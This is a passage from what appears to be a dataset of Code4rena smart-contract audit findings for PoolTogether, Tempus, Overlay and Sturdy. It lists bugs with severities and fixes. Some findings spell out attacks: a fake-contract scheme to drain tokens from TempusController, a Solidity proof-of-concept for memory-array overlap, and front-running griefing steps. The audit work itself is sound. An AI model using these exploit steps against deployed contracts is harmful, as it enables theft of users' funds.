if (_userValueAdjusted > _userDebt) {
    _userValueAdjusted -= _userDebt;
} else {
    _userValueAdjusted = 0;
    _feeAmount = _userNotional > _userDebt ? _userNotional - _userDebt : 0;
}
```"
49.md,Timelock and events for governor functions,medium,"#### Impact

There are contracts that contain functions that change important parameters of the system, e.g. `OverlayV1Mothership` has `setOVL`, `initializeMarket`, `disableMarket`, `enableMarket`, `initializeCollateral`, `enableCollateral`, `disableCollateral`, `adjustGlobalParams`. None of these functions emit events, nor they are timelocked. Usually, it is a good practice to give time for users to react and adjust to changes.

A similar issue was submitted in a previous contest and assigned a severity of Medium: <https://github.com/code-423n4/2021-09-swivel-findings/issues/101>

#### Recommended Mitigation Steps

Consider using a timelock for critical params of the system and emitting events to inform the outside world."
49.md,Cached version of ovl may be outdated,medium,"#### Impact

contract OverlayV1OVLCollateral and OverlayV1Governance cache ovl address:

```solidity
IOverlayTokenNew immutable public ovl;
```

This variable is initialized in the constructor and fetched from the mothership contract:

```solidity
mothership = IOverlayV1Mothership(_mothership);
ovl = IOverlayV1Mothership(_mothership).ovl();
```

ovl is declared as immutable and later contract interacts with this cached version. However, mothership contains a setter function, so the governor can point it to a new address:

```solidity
function setOVL (address _ovl) external onlyGovernor {
    ovl = _ovl;
}
```

`OverlayV1OVLCollateral` and `OverlayV1Governance` will still use this old cached value.

#### Recommended Mitigation Steps

Consider if this was intended, or you want to remove this cached version and always fetch on the go (this will increase the gas costs though)."
49.md,OverlayToken.burn function could burn tokens of any user,medium,"#### Impact

<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/ovl/OverlayToken.sol#L366>

The burner could burn any amount of tokens of any user.
This is not good solution of burn

#### Tools Used

Manual

#### Recommended Mitigation Steps

Update burn function for only owner can burn his tokens.
Now, `ovl.burn` function is used in OverlayV1OVLCollateral.sol file, and these updates won’t make any issue in protocol."
49.md,Improper Upper Bound Definition on the Fee,medium,"#### Impact

In the `adjustGlobalParams` function on line 1603 of ""<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/mothership/OverlayV1Mothership.sol#L1630>"", `adjustGlobalParams` function does not have any upper or lower bounds. Values that are too large will lead to reversions in several critical functions.

#### Proof of Concept

*   The `setFee` function that begins on line 163 of `adjustGlobalParams` sets the liquidity and transaction fee rates for the market in which the function is called. In this context, the transaction fee is the percentage of a transaction that is taken by the protocol and moved to a designated reserve account. As the name suggests, transaction fees factor in to many of the essential transaction types performed within the system.
*   Navigate to ""<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/mothership/OverlayV1Mothership.sol#L163>"" contract and go to line #163.
*   On the function there is no upper and lower bound defined. Therefore, users can pay higher fees.

#### Tools Used

None

#### Recommended Mitigation Steps

Consider defining upper and lower bounds on the `adjustGlobalParams` function."
14.md,User could lose underlying tokens when redeeming from the `IdleYieldSource`,high,"The `redeemToken` function in `IdleYieldSource` uses `redeemedShare` instead of `redeemAmount` as the input parameter when calling `redeemIdleToken` of the Idle yield source. As a result, users could get fewer underlying tokens than they should.

When burning users' shares, it is correct to use `redeemedShare` (line 130). However, when redeeming underlying tokens from Idle Finance, `redeemAmount` should be used instead of `redeemedShare` (line 131). Usually, the `tokenPriceWithFee()` is greater than `ONE_IDLE_TOKEN`, and thus `redeemedShare` is less than `redeemAmount`, causing users to get fewer underlying tokens than expected.

Recommend changing `redeemedShare` to `redeemAmount` at line [L131](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/yield-source/IdleYieldSource.sol#L129-L131)."
14.md,`YearnV2YieldSource` wrong subtraction in withdraw,high,"When withdrawing from the `vault`, one redeems `yTokens` for `token`s, thus the `token` balance of the contract should increase after withdrawal.
But the contract subtracts the `currentBalance` from the `previousBalance`:

```solidity
uint256 yShares = _tokenToYShares(amount);
uint256 previousBalance = token.balanceOf(address(this));
// we accept losses to avoid being locked in the Vault (if losses happened for some reason)
if(maxLosses != 0) {
    vault.withdraw(yShares, address(this), maxLosses);
} else {
    vault.withdraw(yShares);
}
uint256 currentBalance = token.balanceOf(address(this));
// @audit-issue this seems wrong
return previousBalance.sub(currentBalance);
```

All vault withdrawals fail due to the integer underflow as the `previousBalance` is less than `currentBalance`. Users won't be able to get back their investment.

Recommend that It should return `currentBalance > previousBalance ? currentBalance - previousBalance : 0`"
14.md,`BadgerYieldSource` `balanceOfToken` share calculation seems wrong,high,"When suppling to the `BadgerYieldSource`, some `amount` of `badger` is deposited to `badgerSett` and one receives `badgerSett` share tokens in return which are stored in the `balances` mapping of the user. So far this is correct.

The `balanceOfToken` function should then return the redeemable balance in `badger` for the user's `badgerSett` balance.
It computes it as the pro-rata share of the user balance (compared to the total-supply of `badgerSett`) on the `badger` in the vault:

```solidity
balances[addr].mul(
  badger.balanceOf(address(badgerSett))
).div(
  badgerSett.totalSupply()
)
```

However, `badger.balanceOf(address(badgerSett))` is only a small amount of badger that is deployed in the vault (""Sett"") due to most of the capital being deployed to the _strategies_. Therefore, it under-reports the actual balance:

> Typically, a Sett will keep a small portion of deposited funds in reserve to handle small withdrawals cheaply. [Badger Docs](https://badger-finance.gitbook.io/badger-finance/technical/setts/sett-contract)

Any contract or user calling the `balanceOf` function will receive a value that is far lower than the actual balance.
Using this value as a basis for computations will lead to further errors in the integrations.

Recommend using [`badgerSett.balance()`](https://github.com/Badger-Finance/badger-system/blob/2b0ee9bd77a2cc6f875b9b984ae4dfe713bbc55c/contracts/badger-sett/Sett.sol#L126) instead of `badger.balanceOf(address(badgerSett))` to also account for ""the balance in the Sett, the Controller, and the Strategy""."
14.md,withdraw timelock can be circumvented,high,"One can withdraw the entire `PrizePool` deposit by circumventing the timelock.
Assume the user has no credits for ease of computation:
- user calls `withdrawWithTimelockFrom(user, amount=userBalance)` with their entire balance. This ""mints"" an equivalent `amount` of `timelock` and resets `_unlockTimestamps[user] = timestamp = blockTime + lockDuration`.
- user calls `withdrawWithTimelockFrom(user, amount=0)` again but this time withdrawing `0` amount. This will return a `lockDuration` of `0` and thus `unlockTimestamp = blockTime`. The inner `_mintTimelock` now resets `_unlockTimestamps[user] = unlockTimestamp`
- As `if (timestamp <= _currentTime()) ` is true, the full users amount is now transferred out to the user in the `_sweepTimelockBalances` call.

Users don't need to wait for their deposit to contribute their fair share to the prize pool.
They can join before the awards and leave right after without a penalty which leads to significant issues for the protocol.
It's the superior strategy but it leads to no investments in the strategy to earn the actual interest.

Recommend that the unlock timestamp should be increased by duration each time, instead of being reset to the duration."
14.md,`IdleYieldSource` doesn't use mantissa calculations,high,"Because mantissa calculations are not used in this case to account for decimals, the arithmetic can zero out the number of shares or tokens that should be given.

For example, say I deposit 1 token, expecting 1 share in return. On [L95](https://github.com/sunnyRK/IdleYieldSource-PoolTogether/blob/6dcc419e881a4f0f205c07c58f4db87520b6046d/contracts/IdleYieldSource.sol#L95), if the `totalUnderlyingAssets` is increased to be larger than the number of total shares, then the division would output 0 and I wouldn't get any shares.

Recommend  implementing mantissa calculations like in the contract for the AAVE  yield."
14.md,`safeApprove()` for Yearn Vault may revert preventing deposits causing DoS,medium,"The `_depositInVault()` function for Yearn yield source uses ERC20 `safeApprove()` from OpenZeppelin's SafeERC20 library to give maximum allowance to the Yearn Vault address if the current allowance is less than contract’s token balance.

However, the `safeApprove` function prevents changing an allowance between non-zero values to mitigate a possible front-running attack. It reverts if that is the case. Instead, the `safeIncreaseAllowance` and `safeDecreaseAllowance` functions should be used. Comment from the OZ library for this function:
> “// `safeApprove` should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and ‘safeDecreaseAllowance'""

If the existing allowance is non-zero (say, for e.g., previously the entire balance was not deposited due to vault balance limit resulting in the allowance being reduced but not made 0), then `safeApprove()` will revert causing the user’s token deposits to fail leading to denial-of-service. The condition predicate indicates that this scenario is possible. See [similar Medium-severity finding M03](https://blog.openzeppelin.com/1inch-exchange-audit/).

Recommend using `safeIncreaseAllowance()` function instead of `safeApprove()`."
14.md,Return values of ERC20 `transfer` and `transferFrom` are unchecked,medium,"delamo and cmichel_

In the contracts `BadgerYieldSource` and `SushiYieldSource`, the return values of ERC20 `transfer` and `transferFrom` are not checked to be `true`, which could be `false` if the transferred tokens are not ERC20-compliant (e.g., `BADGER`). In that case, the transfer fails without being noticed by the calling contract.

If warden's understanding of the `BadgerYieldSource` is correct, the `badger` variable should be the `BADGER` token at address `0x3472a5a71965499acd81997a54bba8d852c6e53d`. However, this implementation of `BADGER` is not ERC20-compliant, which returns `false` when the sender does not have enough token to transfer (both for `transfer` and `transferFrom`). See the [source code on Etherscan](https://etherscan.io/address/0x3472a5a71965499acd81997a54bba8d852c6e53d#code) (at line 226) for more details.

Recommend using the [`SafeERC20` library implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) from Openzeppelin and call `safeTransfer` or `safeTransferFrom` when transferring ERC20 tokens.



```solidity
  balances[msg.sender] = balances[msg.sender].sub(requiredSharesBalance);
  badger.transfer(msg.sender, badgerBalanceDiff);
  return (badgerBalanceDiff);
```

> The impact that this would have on the rest of the system is substantial, including causing incorrect balances to be returned and potentially lost funds.
>
> That said, I do not think this is very likely and so high severity seems excessive here. Im adjusting all of these reports to Medium Risk given that lower likelihood."
14.md,`SafeMath` not completely used in yield source contracts,medium,"`SafeMath` is not completely used at the following lines of yield source contracts, which could potentially cause arithmetic underflow and overflow:
1. [line 78](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/yield-source/SushiYieldSource.sol#L78) in `SushiYieldSource`
2. [line 67](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/yield-source/BadgerYieldSource.sol#L67) in `BadgerYieldSource`
3. line [91](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/yield-source/IdleYieldSource.sol#L91) and [98](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/yield-source/IdleYieldSource.sol#L98) in `IdleYieldSource`

Recommend using the `SafeMath` library functions in the above lines."
14.md,The assumption that operator == to (user) may not hold leading to failed timelock deposits,medium,"The contract uses `_msgSender()` to denote an operator who is operating on behalf of the user. This is typically used for meta-transactions where the operator is an intermediary/relayer who may facilitate gas-less transactions on behalf of the user. They may be the same address but it is safer to assume that they may not be.

While the code handles this separation of role in most cases, it misses doing so in `timelockDepositTo()` function where it accounts the `_timelockBalances` to the operator address instead of the user specified `to` address. It assumes they are the same. The corresponding usage in `_mintTimelock()` which is called from `withdrawWithTimelockFrom()` uses the user specified 'from' address and not the `_msgSender()`. Therefore the corresponding usage in `timelockDepositTo()` should be the same.

In the scenario where the operator address != user specified from/to addresses, i.e. meta-transactions, the timelock deposits and withdrawals are made to/from different addresses and so the deposits of timelocked tokens will fail because the operator’s address does not have the required amount of `_timelockBalances`.

Recommend changing `operator` to `from` on [L281](https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/PrizePool.sol#L281) of `timelockDepositTo()` and specifying the scenarios where the role of the operator is applicable and document/implement those accordingly."
14.md,Actual yield source check on address will succeed for non-existent contract,medium,"Low-level calls `call`/`delegatecall`/`staticcall` return true even if the account called is non-existent (per EVM design). [Solidity documentation](https://docs.soliditylang.org/en/v0.8.6/control-structures.html#error-handling-assert-require-revert-and-exceptions) warns:
> ""The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.”

The `staticcall` here will return True even if the `_yieldSource` contract doesn't exist at any incorrect-but-not-zero address, e.g. EOA address, used during initialization by accident.

The hack, as commented, to check if it’s an actual yield source contract, will fail if the address is indeed a contract account which doesn’t implement the `depositToken` function. However, if the address is that of an EOA account, the check will pass here but will revert in all future calls to the yield source forcing contract redeployment after the pool is active. Users will not be able to interact with the pool and abandon it.

Recommend that a contract existence check should be performed on `_yieldSource` prior to the depositToken function existence hack for determining yield source contract."
14.md,`YieldSourcePrizePool_canAwardExternal` does not work,medium,"The idea of `YieldSourcePrizePool_canAwardExternal` seems to be to disallow awarding the interest-bearing token of the yield source, like aTokens, cTokens, yTokens.

> ""@dev Different yield sources will hold the deposits as another kind of token: such a Compound's cToken.  The prize strategy should not be allowed to move those tokens.""

However, the code checks `_externalToken != address(yieldSource)` where `yieldSource` is the actual yield strategy contract and not the strategy's interest-bearing token.
Note that the `yieldSource` is usually not even a token contract except for `ATokenYieldSource` and `YearnV2YieldSource`.

The `_canAwardExternal` does not work as expected. It might be possible to award the interest-bearing token which would lead to errors and loss of funds when trying to redeem underlying.

There doesn't seem to be a function to return the interest-bearing token. It needs to be added, similar to `depositToken()` which retrieves the underlying token."
14.md,Using `transferFrom` on ERC721 tokens,medium,"In the function `awardExternalERC721` of contract `PrizePool`, when awarding external ERC721 tokens to the winners, the `transferFrom` keyword is used instead of `safeTransferFrom`. If any winner is a contract and is not aware of incoming ERC721 tokens, the sent tokens could be locked.

Recommend consider changing `transferFrom` to `safeTransferFrom` at line 602. However, it could introduce a DoS attack vector if any winner maliciously rejects the received ERC721 tokens to make the others unable to get their awards. Possible mitigations are to use a `try/catch` statement to handle error cases separately or provide a function for the pool owner to remove malicious winners manually if this happens."
14.md,no check for `_stakeToken`!=0,low,"The `initializeYieldSourcePrizePool` function of `YieldSourcePrizePool.sol` has a check to make sure `_yieldSource` !=0. However, the `initialize` function  of the comparable `StakePrizePool.sol` doesn't do this check.

Although unlikely this will introduce problems, it is more consistent to check for 0.

[`YieldSourcePrizePool.sol` L24](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/YieldSourcePrizePool.sol#L24)
```solidity
  function initializeYieldSourcePrizePool (... IYieldSource _yieldSource) ... {
..
  require(address(_yieldSource) != address(0), ""YieldSourcePrizePool/yield-source-zero"");
  PrizePool.initialize(
```

[`StakePrizePool.sol` L20](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/StakePrizePool.sol#L20)
```solidity
function initialize ( ..  IERC20Upgradeable _stakeToken)...  {
  PrizePool.initialize(
```

Recommend adding something like the following in the initialize function of `StakePrizePool.sol`:
```solidity
  require(address(_stakeToken) != address(0), ""StakePrizePool/stakeToken-zero"");
```"
14.md,Lack of `nonReentrant` modifier in yield source contracts,low,"_

The `YearnV2YieldSource` contract prevents the `supplyTokenTo`, `redeemToken`, and `sponsor` functions from being reentered by applying a `nonReentrant` modifier. Since these contracts share a similar logic, adding a `nonReentrant` modifier to these functions in all of the yield source contracts is reasonable. However, the same protection is not seen in other yield source contracts.

A `nonReentrant` modifier in the following functions is missing:
1. The `sponsor` function of `ATokenYieldSource`
2. The `supplyTokenTo` and `redeemToken` function of `BadgerYieldSource`
3. The `sponsor` function of `IdleYieldSource`
4. The `supplyTokenTo` and `redeemToken` function of `SushiYieldSource`

Recommend adding a `nonReentrant` modifier to these functions. For `BadgerYieldSource` and `SushiYieldSource` contracts, make them inherit from Openzeppelin's `ReentrancyGuardUpgradeable` to use the `nonReentrant` modifier."
14.md,What is default duration when `creditRateMantissa` is not set,low,"In `PrizePool.sol`, if the value of  `_tokenCreditPlans[_controlledToken].creditRateMantissa` isn't set (yet), then the function `_estimateCreditAccrualTime` returns 0.
This means the `TimelockDuration` is 0 and funds can be withdrawn immediately, defeating the entire timelock mechanism.

Recommend perhaps a different default would be useful.

[`PrizePool.sol` L783](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/PrizePool.sol#L783)
```solidity
function _estimateCreditAccrualTime( address _controlledToken,uint256 _principal,uint256 _interest ) internal view returns (uint256 durationSeconds)  {
  uint256 accruedPerSecond = FixedPoint.multiplyUintByMantissa(_principal, _tokenCreditPlans[_controlledToken].creditRateMantissa);
  if (accruedPerSecond == 0) {
    return 0;
  }
  return _interest.div(accruedPerSecond);
}
```

[`PrizePool.sol` L710](https://github.com/code-423n4/2021-06-pooltogether/blob/main/contracts/PrizePool.sol#L710)
```solidity
function _calculateTimelockDuration( address from, address controlledToken, uint256 amount) internal returns (uint256 durationSeconds, uint256 burnedCredit )  {
...
  uint256 duration = _estimateCreditAccrualTime(controlledToken, amount, exitFee);
  if (duration > maxTimelockDuration) {
    duration = maxTimelockDuration;
  }
  return (duration, _burnedCredit);
}
```

Recommend considering the default duration for the case `_tokenCreditPlans[_controlledToken].creditRateMantissa` isn't set."
14.md,`staticCall` to `yieldSource.depositToken` doesn't provide any security guarantees,low,"The assumption that a yield source is valid, just because it has the method `depositToken`, is not a security guarantee. I could create any random contract with that function but that is not a guarantee that the contract will behave as intended.

I believe a better solution would be to have a registry, controlled by governance, that accepts the valid yield sources. A valid registry ensures the the yield sources are properly maintained.

In summary: There is no security difference between having the check and not having the check, because the check can be sidelined without any effort and doesn’t truly provide any guarantee of the contract being valid. Having no checks would save you gas. While having a governance registry would guarantee that the yield sources usable are exclusively the community vetted ones."
14.md,Switch modifier order to consistently place the non-reentrant modifier as the first one,low,"If a function has multiple modifiers they are executed in the order specified. If checks or logic of modifiers depend on other modifiers this has to be considered in their ordering. `PrizePool` has functions with multiple modifiers with one of them being non-reentrant which prevents reentrancy on the functions. This should ideally be the first one to prevent even the execution of other modifiers in case of re-entrancies.

While there is no obvious vulnerability currently with non-reentrant being the last modifier in the list, it is safer to place it in the first. This is of slight concern with the deposit functions which have the `canAddLiquidity()` modifier (before non-reentrant) that makes external calls to get `totalSupply` of controlled tokens.

For reference, see similar finding in [Consensys’s audit of Balancer](https://consensys.net/diligence/audits/2020/05/balancer-finance/#switch-modifier-order-in-bpool).

Recommend switching modifier order to consistently place the non-reentrant modifier as the first one to run so that all other modifiers are executed only if the call is non-reentrant."
14.md,Missing modifier `onlyControlledToken` may result in undefined/exceptional behavior,low,"The modifier `onlyControlledToken` is used for functions that allow the `controlledToken` address as a parameter to ensure that only whitelisted tokens (ticket and sponsorship) are provided. This is used in all functions except `calculateEarlyExitFee()`.

The use of a non-whitelisted `controlledToken` will result in calls to potentially malicious token contract and cause undefined behavior for the `from` user address specified in the call.

Recommend adding missing modifier `onlyControlledToken` to `calculateEarlyExitFee()`.

```solidity
/**
  * @notice Calculate the cost of withdrawing from the Pod if the
  * @param amount Amount of tokens to withdraw when calculating early exit fee.
  * @dev Based of the Pod's total token/ticket balance and totalSupply it calculates the pricePerShare.
*/
function getEarlyExitFee(uint256 amount) external returns (uint256) {
    uint256 tokenBalance = _podTokenBalance();
    if (amount <= tokenBalance) {
        return 0;
    } else {
        // Calculate Early Exit Fee
        (uint256 exitFee, ) =
            _prizePool.calculateEarlyExitFee(
                address(this),
                address(ticket),
                amount.sub(tokenBalance)
            );
        // Early Exit Fee
        return exitFee;
    }
}
```"
14.md,Missing calls to `init` functions of inherited contracts,low,"Most contracts use the `delegateCall` proxy pattern and hence their implementations require the use of `initialize()` functions instead of constructors. This requires derived contracts to call the corresponding `init` functions of their inherited base contracts. This is done in most places except a few.

The inherited base classes do not get initialized which may lead to undefined behavior.
- Missing call to `__ReentrancyGuard_init` in `ATokenYieldSource.sol` [L99-L102](https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/yield-source/ATokenYieldSource.sol#L99-L102) and [L59-L61](https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/yield-source/IdleYieldSource.sol#L59-L61)
- Missing call to `__ERC20_init` in `ATokenYieldSource.sol` [L59-L61](https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/yield-source/IdleYieldSource.sol#L59-L61) and [L83-L86](https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/yield-source/YearnV2YieldSource.sol#L83-L86)

Recommend adding missing calls to init functions of inherited contracts."
14.md,Unlocked pragma used in multiple contracts,low,"Some contracts (e.g., `PrizePool`) use an unlocked pragma (e.g., `pragma solidity >=0.6.0 <0.7.0;`) which is not fixed to a specific Solidity version. Locking the pragma helps ensure that contracts do not accidentally get deployed using a different compiler version with which they have been tested the most.

Please use `grep -R pragma .` to find the unlocked pragma statements.

Recommend locking pragmas to a specific Solidity version. Consider the compiler bugs in the following lists and ensure the contracts are not affected by them. It is also recommended to use the latest version of Solidity when deploying contracts (see [Solidity docs](https://docs.soliditylang.org/en/v0.8.4/#solidity)).

Solidity compiler bugs:
[Solidity repo - known bugs](https://github.com/ethereum/solidity/blob/develop/docs/bugs.json)
[Solidity repo - bugs by version](https://github.com/ethereum/solidity/blob/develop/docs/bugs_by_version.json)"
14.md,Missing zero-address checks,low,"Checking addresses against zero-address during initialization or during setting is a security best-practice. However, such checks are missing in all address variable initializations.

Allowing zero-addresses will lead to contract reverts and force redeployments if there are no setters for such address variables.

Recommend adding zero-address checks for all initializations of address state variables."
14.md,Overly permissive threshold check allows high yield loss,low,"The Yearn yield source defines `maxLosses` as: “Max % of losses that the Yield Source will accept from the Vault in BPS” and uses a setter `setMaxLosses()` to allow owner to set this value. However, the threshold check implemented only checks if this value is less than 10_000 or 100%, which is a good sanity check but allows loss of even 100%. The buffer for the loss is to avoid funds being locked in the Yearn vault in any emergency situation.

If the losses are really high for some reason, it will impact the interest and the prizes.

Perform a tighter upper threshold check to allow a more acceptable max loss value in `setMaxLosses()`"
14.md,Ignored return values may lead to undefined behavior,low,"The `_depositInVault()` returns the value returned from its call to the Yearn vault’s `deposit()` function. However, the return value is ignored at both call sites in `supplyTokenTo()` and `sponsor()`.

 It is unclear what the intended usage is and how, if any, the return value should be checked. This should perhaps check how much of the full balance was indeed deposited/rejected in the vault by comparing the return value of issued vault shares as commented: “The actual amount of shares that were received for the deposited tokens” because ""if deposit limit is reached, tokens will remain in the Yield Source and they will be queued for retries in subsequent deposits.”

Recommend checking return value appropriately or if not, document why this is not necessary."
14.md,Using `memory[]` parameter without checking its length,low,"Using memory array parameters (e.g.` uint[]` memory) as function parameters can be tricky in Solidity, because an attack is possible with a very large array which will overlap with other parts of the memory.

This an example to show the exploit based on [`Exploit.sol`](https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol):
```solidity
pragma solidity ^0.4.24; // only works with low solidity version

contract test{
    struct Overlap {
        uint field0;
    }
    event log(uint);

  function mint(uint[] memory amounts) public  returns (uint) {   // this can be in any solidity version
       Overlap memory v;
       v.field0 = 1234;
       emit log(amounts[0]); // would expect to be 0 however is 1234
       return 1;
     }

  function go() public { // this part requires the low solidity version
      uint x=0x800000000000000000000000000000000000000000000000000000000000000; // 2^251
      bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, x);
      bool success=address(this).call(payload);
  }
}
```

Recommend checking the array length before using it"
14.md,Uneven use of events,low,"To track off-chain data it is necessary to use events

In `ATokenYieldSource.sol`, `IdleYieldSource.sol`, and `yearnV2yieldsource`, events are emmitted in `supplyTokenTo()`, `redeemToken()`, and `sponsor()`, but not in `BadgerYieldsource.sol` and `shushiyieldsource.sol`

Recommend using events."
14.md,Missing parameter validation,low,"Some parameters of functions are not checked for invalid values:
- `StakePrizePool.initialize`: `address _stakeToken` not checked for non-zero or contract
- `ControlledToken.initialize`: `address controller` not checked for non-zero or contract
- `PrizePool.withdrawReserve`: `address to` not checked for non-zero, funds will be lost when sending to zero address
- `ATokenYieldSource.initialize`: `address _aToken, _lendingPoolAddressesProviderRegistry` not checked for non-zero or contract
- `BadgerYieldSource.initialize`: `address badgerSettAddr, badgerAddr` not checked for non-zero or contract
- `SushiYieldSource.constructor`: `address _sushiBar, _sushiAddr` not checked for non-zero or contract

Wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.

Recommend validating the parameters."
14.md,`ATokenYieldSource` mixes aTokens and underlying when redeeming,low,"The `ATokenYieldSource.redeemToken` function burns `aTokens` and sends out underlying; however, it's used in a reverse way in the code:
The `balanceDiff` is used as the `depositToken` that is transferred out but it's computed on the **aTokens** that were burned instead of on the `depositToken` received.

It should not directly lead to issues as aTokens are 1-to-1 with their underlying but we still recommend doing it correctly to make the code more robust against any possible rounding issues.

Recommend computing `balanceDiff` on the underyling balance (`depositToken`), not on the aToken. Then, subtract the actual burned aTokens from the user shares."
14.md,`onERC721Received` not implemented in `PrizePool`,low,"The `PrizePool` contract does not implement the `onERC721Received` function, which is considered a best practice to transfer ERC721 tokens from contracts to contracts. The absence of this function could prevent `PrizePool` from receiving ERC721 tokens from other contracts via `safeTransferFrom`.

Consider adding an implementation of the `onERC721Received` function in `PrizePool`."
14.md,Lack of event emission after critical `initialize()` functions,low,"Most contracts use `initialize()` functions instead of constructor given the `delegatecall` proxy pattern. While most of them emit an event in the critical `initialize()` functions to record the init parameters for off-chain monitoring and transparency reasons, `Ticket.sol` nor its base class `ControlledToken.sol` emit such an event in their `initialize()` functions.

These contracts are initialized but their critical init parameters (name, symbol, decimals and controller address) are not logged for any off-chain monitoring.

See similar [Medium-severity Finding M01](https://blog.openzeppelin.com/uma-audit-phase-4/) in OpenZeppelin’s audit of UMA protocol.

Recommend emitting an initialized event in `Ticket.sol` and `ControlledToken.sol` logging their init parameters."
37.md,Steal tokens from TempusController,high,".

#### Impact

The function `\_depositAndProvideLiquidity` can be used go retrieve arbitrary ERC20 tokens from the TempusController.sol contract.

As the test contract of TempusController.sol <https://goerli.etherscan.io/address/0xd4330638b87f97ec1605d7ec7d67ea1de5dd7aaa> shows, it has indeed ERC20 tokens.

The problem is due to the fact that you supply an arbitrary tempusAMM to depositAndProvideLiquidity and thus to `\_depositAndProvideLiquidity`.
tempusAMM could be a fake contract that supplies values that are completely fake.

At the end of the function `\_depositAndProvideLiquidity`, ERC20 tokens are send to the user. If you can manipulate the variables ammTokens,  mintedShares  and sharesUsed you can send back
any tokens held in the contract
""ammTokens\[0].safeTransfer(msg.sender, mintedShares - sharesUsed\[0]);""

The Proof of Concept shows an approach to do this.

#### Proof of Concept

- <https://github.com/code-423n4/2021-10-tempus/blob/63f7639aad08f2bba717830ed81e0649f7fc23ee/contracts/TempusController.sol#L73-L79>

- <https://github.com/code-423n4/2021-10-tempus/blob/63f7639aad08f2bba717830ed81e0649f7fc23ee/contracts/TempusController.sol#L304-L335>

- Create a fake Vault contract (fakeVault) with the following functions:
`fakeVault.getPoolTokens(poolId)` --> returns {TokenToSteal1,TokenToSteal2},{fakeBalance1,fakeBalance2},0
`fakeVault.JoinPoolRequest()` --> do nothing
`fakeVault.joinPool()` --> do nothing

- Create a fake Pool contract (fakePool) with the following functions:
`fakePool.yieldBearingToken()` --> returns fakeYieldBearingToken
`fakePool.deposit()` --> returns fakeMintedShares,....

- Create a fake ammTokens contract with the following functions:
`tempusAMM.getVault()` --> returns fakeVault
`tempusAMM.getPoolId()` --> returns 0
`tempusAMM.tempusPool()` --> returns fakePool

- call depositAndProvideLiquidity(fakeTempusAMM,1,false) // false -> yieldBearingToken
\_getAMMDetailsAndEnsureInitialized returns fakeVault,0, {token1,token2},{balance1,balance2}
\_deposit(fakePool,1,false) calls \_depositYieldBearing which calls `fakePool.deposit()`  and returns fakeMintedShares
\_provideLiquidity(...)  calculates a vale of ammLiquidityProvisionAmounts
\_provideLiquidity(...)  skips the safeTransferFrom because sender == address(this))
the calls to fakeVault.JoinPoolRequest() and fakeVault.joinPool() can be faked.
\_provideLiquidity(...)  returns the value ammLiquidityProvisionAmounts

Now fakeMintedShares - ammLiquidityProvisionAmounts number of TokenToSteal1 and TokenToSteal2 are transferred to msg.sender

As you can both manipulate TokenToSteal1 and fakeMintedShares, you can transfer any token to msg.sender

#### Recommended Mitigation Steps

Create a whitelist for tempusAMMs"
37.md,`exitTempusAMM` can be made to fail,medium,".

There's a griefing attack where an attacker can make any user transaction for `TempusController.exitTempusAMM` fail.
In `_exitTempusAMM`, the user exits their LP position and claims back yield and principal shares.
The LP amounts to redeem are determined by the function parameter `lpTokensAmount`.
A final `assert(tempusAMM.balanceOf(address(this)) == 0)` statement checks that the LP token amount of the contract is zero after the exit.
This is only true if no other LP shares were already in the contract.

However, an attacker can frontrun this call and send the smallest unit of LP shares to the contract which then makes the original deposit-and-fix transaction fail.

#### Impact

All `exitTempusAMM` calls can be made to fail and this function becomes unusable.

#### Recommended Mitigation Steps

Remove the `assert` check."
37.md,`depositAndFix` can be made to fail,medium,".

There's a griefing attack where an attacker can make any user transaction for `TempusController.depositAndFix` fail.
In `_depositAndFix`, `swapAmount` many yield shares are swapped to principal where `swapAmount` is derived from the function arguments.
A final `assert(yieldShares.balanceOf(address(this)) == 0)` statement checks that the yield shares of the contract are zero after the swap.
This is only true if no other yield shares were already in the contract.

However, an attacker can frontrun this call and send the smallest unit of yield shares to the contract which then makes the original deposit-and-fix transaction fail.

#### Impact

All `depositAndFix` calls can be made to fail and this function becomes unusable.

#### Recommended Mitigation Steps

Remove the `assert` check."
125.md,Hard-coded slippage may freeze user funds during market turbulence,high,"[GeneralVault.sol#L125](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L125)<br>
GeneralVault set a hardcoded slippage control of 99%. However, the underlying yield tokens price may go down.<br>
If Luna/UST things happen again, users' funds may get locked.<br>

[LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137)<br>
Moreover, the withdrawal of the lidoVault takes a swap from the curve pool. 1 stEth worth 0.98 ETH at the time of writing.<br>
The vault can not withdraw at the current market.<br>

Given that users' funds would be locked in the lidoVault, I consider this a high-risk issue.

### Proof of Concept

[1 stEth  = 0.98 Eth](https://twitter.com/hasufl/status/1524717773959700481/photo/1)

[LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137)

### Recommended Mitigation Steps

There are different ways to set the slippage.

